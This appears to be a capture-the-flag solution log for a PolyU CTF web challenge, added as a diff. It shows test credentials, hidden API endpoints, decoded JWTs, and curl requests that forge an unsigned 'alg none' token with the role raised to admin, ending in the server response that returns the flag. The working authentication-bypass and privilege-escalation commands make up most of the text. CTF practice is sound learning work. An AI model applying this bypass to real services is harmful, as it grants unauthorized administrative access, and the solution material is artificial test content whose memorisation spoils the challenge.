@@ -1,0 +1,46 @@
+Your Login Credentials:
+Username: student001
+Password: password123
+
+<!--
+      Available API endpoints:
+      - /api/login - Authentication endpoint
+      - /api/user - User information
+      - /api/notices - Public notices
+      - /api/achievements - User achievements  
+      - /api/flags - Public flags
+      - /api/debug/config - Configuration settings
+      - /api/dev/tools - Development utilities
+    -->
+
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJzdHVkZW50MDAxIiwicm9sZSI6InN0dWRlbnQiLCJzdHVkZW50SWQiOiJTMTIzNDUiLCJpYXQiOjE3NDUyMDE4ODQsImV4cCI6MTc0NTIwOTA4NH0.EtCLfRQJxeASyRFKB4fMobY66DpVNEOQPtCwGqzVjjs
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+{
+  "id": 1,
+  "username": "student001",
+  "role": "student",
+  "studentId": "S12345",
+  "iat": 1745201884,
+  "exp": 1745209084
+}
+$ curl -i -X GET -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJzdHVkZW50MDAxIiwicm9sZSI6InN0dWRlbnQiLCJzdHVkZW50SWQiOiJTMTIzNDUiLCJpYXQiOjE3NDUyMDE4ODQsImV4cCI6MTc0NTIwOTA4NH0.EtCLfRQJxeASyRFKB4fMobY66DpVNEOQPtCwGqzVjjs" -g ^"http://chal.polyuctf.com:41338/api/flags?debug=true^&testing=true^&jwt_verify_options={^\^"algorithms^\^":[^\^"HS256^\^"]}^"
+
+$ curl -i -X GET -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJzdHVkZW50MDAxIiwicm9sZSI6InN0dWRlbnQiLCJzdHVkZW50SWQiOiJTMTIzNDUiLCJpYXQiOjE3NDUyMDE4ODQsImV4cCI6MTc0NTIwOTA4NH0.EtCLfRQJxeASyRFKB4fMobY66DpVNEOQPtCwGqzVjjs" -g ^"http://chal.polyuctf.com:41338/api/flags?debug=true^&testing=true^&jwt_verify_options={^\^"algorithms^\^":[^\^"none^\^"]}^"
+
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJzdHVkZW50MDAxIiwicm9sZSI6ImFkbWluIiwic3R1ZGVudElkIjoiUzEyMzQ1IiwiaWF0IjoxNzQ1MjAxODg0LCJleHAiOjE3NDUyMDkwODR9.
+$ curl -i -X GET -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJzdHVkZW50MDAxIiwicm9sZSI6InN0dWRlbnQiLCJzdHVkZW50SWQiOiJTMTIzNDUiLCJpYXQiOjE3NDUyMDE4ODQsImV4cCI6MTc0NTIwOTA4NH0." -g ^"http://chal.polyuctf.com:41338/api/flags?debug=true^&testing=true^&jwt_verify_options={^\^"algorithms^\^":[^\^"none^\^"]}^"
+$ curl -i -X POST -H ^"Content-Type: application/json^" --data-raw ^"^{^\^"username^\^":^\^"student001^\^",^\^"password^\^":^\^"password123^\^",^\^"debug^\^":true^}^" -g ^"http://chal.polyuctf.com:41338/api/login?testing=true^&debug=1^"
+
+$ curl -i -X GET -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJzdHVkZW50MDAxIiwicm9sZSI6ImFkbWluIiwic3R1ZGVudElkIjoiUzEyMzQ1IiwiaWF0IjoxNzQ1MjAxODg0LCJleHAiOjE3NDUyMDkwODR9." -g 'http://chal.polyuctf.com:41338/api/flags?testing=true&jwt_verify_options={"testing":true,"verify":false,"algorithm":"none"}'
+HTTP/1.1 200 OK
+server: nginx/1.27.5
+date: Mon, 21 Apr 2025 12:58:53 GMT
+content-type: application/json; charset=utf-8
+content-length: 227
+x-powered-by: Express
+etag: W/"e3-see/HVoCsdUEnHivjoqAN1WhRiU"
+
+{"flags":[{"id":1,"name":"CTF_FLAG","flag":"PUCTF25{JWT_NONE_ALG_BYPASS_8f4e29c7d5a6b3e1f0a2c9d8b7e6f5a4}","isHidden":true},{"id":2,"name":"ACHIEVEMENT_UNLOCKED","flag":"FLAG{not_the_real_flag_keep_looking}","isHidden":false}]}
